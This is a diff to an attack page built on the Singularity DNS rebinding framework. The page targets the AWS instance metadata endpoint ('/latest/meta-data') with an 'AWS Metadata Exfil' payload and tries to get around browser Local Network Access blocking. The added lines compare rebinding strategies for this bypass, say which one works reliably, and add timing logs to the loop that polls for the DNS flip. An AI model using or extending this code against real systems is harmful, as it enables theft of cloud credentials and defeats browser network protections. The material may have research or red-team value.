@@ -18,6 +18,12 @@
       6. Reads popup.document.documentElement.outerHTML (same-origin)
       7. Dispatches response body to the configured payload
 
+    Strategy compatibility:
+      - 'fs' (recommended): deterministic flip after one DNS cache cycle (~60s)
+      - 'rr': works but may need 2+ cycles if cache expiry hits attacker round
+      - 'rd': unreliable — 50% chance initial redirect gets target IP
+      - 'ma': does not work — both IPs always present, no clean DNS flip
+
     See WIKI.md for full write-up.
 -->
 <head>
@@ -97,9 +103,17 @@
         targetPort:          '80',
         targetPath:          '/latest/meta-data',
 
-        // Rebinding — see WIKI.md "Strategy gotchas" before changing
-        rebindingStrategy:   'fs',     // 'fs' | 'rr' | 'rd' | 'ma'
-        interval:            '20',     // seconds between fetch polls
+        // Rebinding strategy (encoded in Singularity subdomain)
+        //   'fs'  — RECOMMENDED. First query → attacker, all subsequent → target.
+        //           Deterministic. One DNS cache cycle (~60s) then LNA blocks fetch.
+        //   'rr'  — Round-robin. Alternates attacker/target per query. Works but
+        //           may take 2+ cache cycles (~120s+) if expiry lands on attacker round.
+        //   'rd'  — Random. 50/50 each query. Initial redirect may get target IP,
+        //           breaking the flow. NOT RECOMMENDED for LNA bypass.
+        //   'ma'  — Multiple answers (both IPs). Browser picks one and may never
+        //           switch. DOES NOT WORK for LNA bypass.
+        rebindingStrategy:   'fs',
+        interval:            '20',     // seconds between fetch polls (~3 polls per DNS cache cycle)
 
         // Payload — must match a key registered in payloads/*.js
         attackPayload:       'AWS Metadata Exfil',
@@ -202,8 +216,16 @@
             // Step 2: poll fetch("/") to detect when Singularity flips DNS
             // While DNS points to attacker IP, fetch succeeds.
             // After DNS flips to target IP, LNA blocks fetch → TypeError.
+            //
+            // With 'fs': one DNS cache cycle (~60s), then target IP on all queries.
+            // With 'rr': may take multiple cache cycles if expiry hits attacker round.
+            log('Strategy: ' + CONFIG.rebindingStrategy);
             log('Polling fetch("/") every ' + CONFIG.interval + 's to detect LNA block...');
-            log('Waiting for browser DNS cache to expire (~60s)...');
+            if (CONFIG.rebindingStrategy === 'rr') {
+                log('Round-robin may need multiple DNS cache cycles (~120s+)...');
+            } else {
+                log('Waiting for browser DNS cache to expire (~60s)...');
+            }
 
             const pollMs = parseInt(CONFIG.interval) * 1000;
             let rebindDetected = false;
@@ -213,10 +235,14 @@
                 try {
                     await fetch('/', { cache: 'reload' });
                     polls++;
-                    if (polls % 5 === 0) log('Still on attacker IP (' + polls + ' polls)...');
+                    if (polls % 5 === 0) {
+                        const elapsed = Math.round(polls * pollMs / 1000);
+                        log('Still on attacker IP (' + polls + ' polls, ~' + elapsed + 's)...');
+                    }
                 } catch (e) {
                     rebindDetected = true;
-                    log('LNA block after ' + polls + ' polls — rebind detected!');
+                    const elapsed = Math.round(polls * pollMs / 1000);
+                    log('LNA block after ' + polls + ' polls (~' + elapsed + 's) — rebind detected!');
                 }
                 if (!rebindDetected) {
                     await new Promise(r => setTimeout(r, pollMs));
